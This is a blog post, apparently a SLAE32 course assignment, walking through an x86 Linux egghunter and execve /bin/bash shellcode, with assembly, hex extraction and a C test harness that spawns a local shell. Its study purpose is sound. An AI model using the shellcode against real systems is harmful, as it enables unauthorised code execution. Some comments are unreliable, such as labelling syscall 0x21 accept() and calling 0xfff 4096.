---
title: SLAE32 Assignment 3 - Egghunter Shellcode
date: 2019-8-18
layout: single
classes: wide
tags:
  - egghunter
  - execve
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcode
---
![](/assets/images/SLAE32.png)
```console
This blog post has been created for completing the requirements
 of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
	- Now at: https://www.pentesteracademy.com/course?id=3
SLAE/Student ID: PA-10913
```
## Overview
For our third assignment in the SLAE32 course we were tasked with creating an `egghunter`.  
What is an Egg Hunter?   
+ An Egghunter is a piece of injectable shellcode that will search the memory of the running program for the a specific, larger payload. 
+ Once the Egghunter finds the larger payload, it will pass program control to it by executing it.  

The larger payload that our Egghunter will search for and execute will be the `execve-stack` shellcode provided in the SLAE32 course.  

## Egghunter Assembly Code
```nasm
; Filename: eggHunter.asm
; Author:   boku
global _start
_start:
; Configure Egg in EBX
  mov ebx, 0x50905090
; Clear EAX, ECX, EDX
  xor ecx, ecx         ; Clears the ECX Register. 
  mul ecx              ; ECX*EAX. Result is stored in EDX:EAX. 
; Jump here to move forward a memory page
nextPage:              ; Increments the memory address stored in EDX by 4096 Bytes (a memory page)
  or dx, 0xfff         ; 0xfff = 4096. This is the size of Linux Memory pages.
; Jump here to move forward 4 bytes on a memory page
nextAddress:           ; Increments the memory address stored in EDX by 4 Bytes 
  inc edx              ; in combo with the or dx above, this moves the memory scanner EDX by a page
                       ; in combo with the cmp [edx+0x4] below, this aligns EDX so it will scan the
                       ;  next memory address
 ; 4095*2=8190+1=8191. 
 ;                                      --> (inc edx) 4095+1  -->  (inc edx) 8191+1
 ; or dx when edx is: \x00000000        |   \x00001000 = 4096 |    \x00002000 = 8192
 ;               OR   \x00000FFF        |   \x00000FFF = 4095 |    \x00000FFF = 4095
 ;          RESULTS:  \x00000FFF = 4095--   \x00001FFF = 8191--    \x00002FFF = 12287

; Save the registers before accept() system-call because they will be altered after the call
 pusha                 ; Pushes all 16-bit registers onto the stack
 lea ebx, [edx+0x4]    ; Increments the Memory Address of EDX by 4 Bytes.
                       ;  Stores the value stored at EDX+4 into the EBX register
 mov al, 0x21          ; System Call for accept() 
 int 0x80              ; Executes accept()
; Check if memory page is accessible
 cmp al, 0xf2          ; The return value of accept() is stored in EAX. 
                       ;  Checks if access is denied
; Load the registers that were stored onto the stack

 popa                  ; Pops all 16-bit registers from the stack
; if accept() could not access the memory page, go to the next page
 jz nextPage           ; If page access is denied, check the next memory page 
; if accept() could access the memory page, 
;  check if the egg is in the first memory location on the page
 cmp [edx], ebx
; if the egg is not there, then increment our location 
;  on the page by 1 byte and check there
 jnz nextAddress
; if the egg is there, check the next for bytes to make 
;  sure it is our payload and not the egghunter itself.
 cmp [edx+0x4], ebx
; if the egg isn't there then it is a fluke or 
;  is our egghunter. Check the next address.
 jnz nextAddress
; if the egg is there twice, then we found our payload. 
;  Jump to the memory location on that page
;  and transfer control to our payload.
 jmp edx
```

## Compiling and Testing the EggHunter
### Compiling the EggHunter Assembly Code
```nasm 
root# nasm -f elf32 eggHunter.asm -o eggHunter.o
root# ld -z execstack eggHunter.o -o eggHunter
```

### Compiling a Payload for the EggHunter to Find
#### SLAE32 Execve-Stack `/bin/bash` Shellcode
```nasm
; Filename: execve-stack.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com

global _start

section .text
_start:

; PUSH the first null dword
xor eax, eax
push eax
; PUSH ////bin/bash (12)
push 0x68736162
push 0x2f6e6962
push 0x2f2f2f2f
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 11
int 0x80
```
#### Compiling the Payload
```console
t# nasm -f elf32 execve-stack.nasm -p execve-stack.o
root# ld -z execstack execve-stack.o -o execve-stack
```

#### Testing the Payload
```console
root# ps -p $$
  PID TTY          TIME CMD
14383 pts/5    00:00:00 bash
root# ./execve-stack 
root# ps -p $$
  PID TTY          TIME CMD
  584 pts/5    00:00:00 bash
```

### Testing the EggHunter in a Host Program
#### Grabbing the Hex for the Execve Shellcode
```console
root# objdump -d execve-stack | grep '[0-9a-f]:' | grep -v 'file' | \
> cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | \
> sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | \
> sed 's/^/"/' | sed 's/$/"/g'
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f"
"\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```
#### Grabbing the Hex from our EggHunter Shellcode
```console
root# objdump -d eggHunter | grep '[0-9a-f]:' | grep -v 'file' | \
> cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | \
> sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | \
> sed 's/^/"/' | sed 's/$/"/g'
"\xbb"
"\x90\x50\x90\x50"  # Our Egg
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21"
"\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9"
"\xff\xe2"
```
#### Host Program in C
```c
// Filename: testEggHunter.c
// Author:   boku
#include <stdio.h>
#include <string.h>
// This is the egg for our eggHunter
// the egg should be 4 bytes and be executable
#define egg "\x90\x50\x90\x50"

// Put two eggs in front of our payload
// This allows our eggHunter to find it in memory
unsigned char payload[] =
egg
egg
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f"
"\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Replace the hardcoded egg with a variable.
// This allows us to easily change the egg for our eggHunter.
unsigned char egghunter[] =
"\xbb"
egg
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21"
"\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9"
"\xff\xe2";

// This program will run our egghunter.
// Our eggHunter will search memory until it finds 2 eggs.
// Once the payload is found it will pass control to the payload.

int main()
{
    printf("Memory Location of Payload: %p\n", payload);
    printf("Size of Egghunter:          %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
```

#### Compiling the Host Program 
```c
root# gcc testEggHunter.c -o testEggHunter -fno-stack-protector -z execstack
```

#### Testing the EggHunter in the Host Program
```console
root# ps -p $$
  PID TTY          TIME CMD
14383 pts/5    00:00:00 bash
root# ./testEggHunter 
Memory Location of Payload: 0x804a040
Size of Egghunter:          39
root# ps -p $$
  PID TTY          TIME CMD
 3048 pts/5    00:00:00 bash
```
+ Before we run our program we get the Program ID of our bash shell.
  - Our `bash` PID is 14383.
+ After running our eggHunter we check to see that it found our payload, and spawned a new bash shell.
  - Our `bash` PID is now 3048. 
  - We have successfully spawned a new bash shell.
